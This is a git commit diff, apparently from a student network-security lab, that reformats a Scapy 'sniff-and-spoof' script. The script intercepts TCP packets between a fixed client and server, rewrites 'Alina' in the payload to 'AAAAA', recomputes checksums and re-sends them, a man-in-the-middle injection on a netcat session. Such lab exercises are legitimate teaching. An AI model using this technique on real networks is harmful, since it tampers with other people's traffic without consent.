1877c6953ebdebbdaab03be7e6a807a9cd7759f2
Alina Sul <48648714+Alina-sul@users.noreply.github.com>
2023-03-10 15:00:14 +0200

    task 3

--- Task 2/sniff-and-spoof-netcat.py
+++ Task 2/sniff-and-spoof-netcat.py
@@ -14,17 +14,17 @@ server_mac = "08:00:27:eb:6e:8a"
 
 def spoof_pkt(pkt):
     if pkt[IP].src == client_ip and pkt[IP].dst == server_ip and pkt[TCP].payload:
-        original_pkt = (pkt[TCP].payload.load)
+        original_pkt = pkt[TCP].payload.load
         data = original_pkt.decode()
         string = re.sub(r'Alina', 'A' * 5, data)
         new_pkt = pkt[IP]
-        del(new_pkt.chksum)
-        del(new_pkt[TCP].payload)
-        del(new_pkt[TCP].chksum)
+        del new_pkt.chksum
+        del new_pkt[TCP].payload
+        del new_pkt[TCP].chksum
         new_pkt = new_pkt/string
         print("Data transformed from: "+str(original_pkt)+" to: "+ string)
         send(new_pkt, verbose = False)
-	elif pkt[IP].src == server_ip and pkt[IP].dst == client_ip:
+    elif pkt[IP].src == server_ip and pkt[IP].dst == client_ip:
         new_pkt = pkt[IP]
         send(new_pkt, verbose = False)
 
